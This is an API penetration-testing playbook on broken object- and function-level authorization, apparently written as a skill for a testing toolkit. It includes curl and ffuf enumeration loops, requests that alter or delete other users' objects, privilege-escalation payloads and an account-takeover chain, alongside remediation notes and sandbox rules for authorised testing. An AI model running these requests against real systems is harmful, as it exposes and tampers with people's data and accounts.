# Broken Object Level Authorization (BOLA) and Broken Function Level Authorization (BFLA) — Skill Playbook

**Mitre ATT&CK ID:** T1190 (Exploit Public-Facing Application), T1078 (Valid Accounts)
**OWASP Mapping:** A01:2021 – Broken Access Control
**Severity:** Critical / High
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: bola-bfla-v1
category: api-security
author: HiveBreach
mitre_attack_id: T1190
owasp_mapping:
  - A01:2021-Broken Access Control
tags:
  - bola
  - bfla
  - idor
  - access-control
  - authorization
  - graphql
  - T1190
environments:
  - api
  - web
  - graphql
  - microservice
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Identify Object Identifiers

Look for user-controlled object references:

| Location | Examples | Risk |
|---|---|---|
| URL path | `/api/users/123`, `/api/orders/12345` | High |
| Query string | `?id=`, `?user_id=`, `?account=` | High |
| JSON body | `{"user_id":123}` | High |
| Nested objects | `/api/orders/{id}/items/{item}` | High |
| GraphQL args | `query { order(id: 123) }` | High |
| Upload filename | `file_id`, `document_id` | Medium |

Candidates: `id`, `uid`, `user_id`, `userId`, `account_id`, `order_id`, `invoice_id`, `file_id`, `post_id`, `message_id`, `transaction_id`, `booking_id`, `uuid`, `guid`.

### 1.2 Access Control Model Mapping

1. Register two low-priv accounts (A and B)
2. As A, obtain a valid object ID (`/api/orders/1000`)
3. As B, request A's object -> if received, BOLA

Check per endpoint: owner-based (own objects only), role-based (role checked per object), function-based (BFLA when admin-restricted).

### 1.3 Automated Discovery

```bash
# ffuf with ID wordlists
ffuf -u https://target.com/api/orders/FUZZ -w ids.txt -H "Authorization: Bearer <tokenB>" -mc 200 -fs 403
seq 1 5000 > ids.txt

# Parameter discovery
arjun -u https://target.com/api/order/123 -m JSON -T 10

# Burp Autorize/AuthMatrix: capture as user A, replay as user B; flag responses differing from 403 baseline
```

---

## 2. Confirmation

### 2.1 Horizontal Privilege Escalation (BOLA)

```bash
# Baseline as owner
curl -s https://target.com/api/orders/1000 -H "Authorization: Bearer <tokenA>"

# Cross-tenant access
curl -s https://target.com/api/orders/1000 -H "Authorization: Bearer <tokenB>"
# 200 returning A's data = BOLA confirmed

for id in $(seq 1000 1100); do
  curl -s -o /dev/null -w "%{http_code} $id\n" https://target.com/api/orders/$id -H "Authorization: Bearer <tokenB>"
done
```

### 2.2 Vertical Privilege Escalation (BFLA)

```bash
curl -s -X POST https://target.com/api/admin/users -H "Authorization: Bearer <userToken>" -d '{"email":"x@y.com"}'
for ep in admin audit debug export config users/roles health/stats internal; do
  curl -s -o /dev/null -w "%{http_code} /api/$ep\n" https://target.com/api/$ep -H "Authorization: Bearer <userToken>"
done
```

BFLA indicators: 200/201 instead of 403, partial data, non-standard errors, timing differences on unauthorized paths.

### 2.3 UUID Enumeration and Batch Bypass

```bash
# Extract other UUIDs from an object and test them
curl -s https://target.com/api/orders/1000 -H "Authorization: Bearer <tokenA>" | jq '.customer_id, .payment_ref'

# GraphQL batching in one request
curl -s https://target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"query { a: order(id:1){id} b: order(id:2){id} c: order(id:3){id} }"}'
```

---

## 3. Exploitation

### 3.1 PATCH/PUT Object Modification

```bash
# Read BOLA then write BOLA
curl -s -X PATCH https://target.com/api/orders/1000 \
  -H "Authorization: Bearer <tokenB>" -H "Content-Type: application/json" \
  -d '{"status":"cancelled","refund_amount":0}'
```

Modify `shipping_address`, `email`, `price`, `status` on another user's object. Check state-changing methods even when GET is protected.

### 3.2 HTTP Method Escalation (GET -> POST/PUT)

```bash
curl -X PUT https://target.com/api/users/123/email -H "Authorization: Bearer <tokenB>" -d '{"email":"b@evil.com"}'
curl -X POST https://target.com/api/users/123 -H "Authorization: Bearer <tokenB>" -d '{"role":"admin"}'
curl -X DELETE https://target.com/api/users/123 -H "Authorization: Bearer <tokenB>"
curl -X OPTIONS -i https://target.com/api/users/123

# Header-based overrides
-H "X-HTTP-Method-Override: PUT"
-H "X-Method-Override: PATCH"
-H "X-Original-Method: GET"

# Path normalization: /api/users/123, /api/users/123/, //api/users/123, /API/users/123, %00
```

### 3.3 Mass Assignment vs BOLA Distinction

- BOLA: object referenced by another user's ID is returned/modified
- Mass Assignment: extra fields in the body (e.g. `"role":"admin"`) get bound to the object
- Combined: `PATCH /api/users/{victim_id}` with `{"role":"admin","isActive":true}` escalates a third party

### 3.4 GraphQL BOLA

```graphql
query {
  user(id: 2) { email phone billingAddress }
  order(id: 1001) { total paymentCard }
}
```

Test numeric enumeration even when REST IDs are opaque, if GraphQL accepts numeric IDs.

### 3.5 Chaining to Account Takeover

1. BOLA read `/api/users/{id}/profile` leaks email/phone (PII)
2. BOLA read `/api/users/{id}/tokens` or password-reset endpoint accepts victim email
3. BFLA on `/api/admin/reset-password` resets victim's password
4. BOLA write `/api/users/{id}/email` changes victim's email -> reset goes to attacker inbox
5. Login as victim, pivot to internal APIs

---

## 4. Tool-Specific Guidance

### 4.1 Burp Suite

- **Autorize**: compare user vs admin access on same endpoint
- **AuthMatrix**: matrix of users x roles x endpoints
- **Turbo Intruder**: iterate object IDs
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5, requestsPerConnection=5)
    for i in range(1, 1000):
        engine.queue(target.req, str(i))
```

### 4.2 ffuf

```bash
ffuf -u https://target.com/api/orders/FUZZ -w <(seq 1 5000) -fs 57 -fc 403,404 -H "Authorization: Bearer <tokenB>"
```

### 4.3 nuclei / Postman

```bash
nuclei -u https://target.com/api -t ~/nuclei-templates/http/exposures/ -jsonl bola.jsonl
newman run collection.json -e env.json --env-var auth_token=<tokenB> --iteration-data ids.csv
```

---

## 5. PoC Generation

### PoC Template

```markdown
## BOLA/BFLA — [FINDING_ID]

**Endpoint:** https://target.com/api/orders/1000
**Method:** GET / PATCH
**Type:** BOLA (horizontal) / BFLA (vertical)
**Victim object:** order 1000 (user A)
**Attacker session:** user B

### Request
curl -s https://target.com/api/orders/1000 -H "Authorization: Bearer <tokenB>"

### Evidence
- 200 OK returning user A's data to user B
- Modified order 1000 status to "cancelled" as user B
- 2xx on admin-only endpoint as normal user

### Impact
- PII disclosure (email, phone, address)
- Financial data disclosure / order manipulation
- Account takeover via chained BOLA on email change

### Remediation
- Enforce server-side ownership checks per object
- Use opaque, non-enumerable identifiers
- Authorize at object AND function level
- Middleware validates owner for every mutation
```

---

## 6. Verification (Sandbox)

### Sandbox Checklist
- [ ] BOLA confirmed with two separate test accounts
- [ ] No production user data accessed
- [ ] Enumeration limited to sandbox datasets
- [ ] Write impacts on throwaway objects only
- [ ] Impact scoped per endpoint (read vs write vs admin)

### Prohibited Actions
- Reading real user data outside scope
- Modifying or deleting production objects
- Enumerating beyond scope boundaries

---

## 7. Cheat Sheet / Reference

| Test | Method | Payload/Path | Expect on vuln |
|---|---|---|---|
| BOLA read | GET | `/api/orders/1000` as B | 200 victim data |
| BOLA write | PATCH | `{"status":"x"}` | 200/204 |
| Method escalate | PUT | same path, other verb | 200 if GET 403 |
| Override | POST | `X-HTTP-Method-Override: PUT` | 200 |
| BFLA | GET | `/api/admin/users` | 200 list |
| UUID enum | GET | `/api/users/{uuid}` | 200 victim profile |
| GraphQL BOLA | query | `user(id:2){email}` | 200 victim data |
| Batch bypass | query | aliases a..z | 200 multiple |

Wordlists:
`/usr/share/seclists/Discovery/Web-Content/API/api-endpoints.txt`, `/usr/share/seclists/Discovery/Web-Content/api/objects.txt`, `/usr/share/seclists/Discovery/Web-Content/Common/accounting_abbreviations.txt`

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Initial access via API |
| T1078 | Valid Accounts | Low-priv account abuse |
| T1530 | Data from Cloud Storage | Data exfil via BOLA |
| T1537 | Transfer Data to Cloud Account | PII exfiltration |
| T1110 | Brute Force | ID/UUID enumeration |
| T1548 | Abuse Elevation Control Mechanism | BFLA role escalation |

---

## 9. References

- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- OWASP API Security (BOLA/BFLA): https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/
- PortSwigger IDOR: https://portswigger.net/web-security/access-control/idor
- AuthMatrix: https://github.com/SecurityInnovation/AuthMatrix
- Autorize: https://github.com/Quitten/Autorize

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*
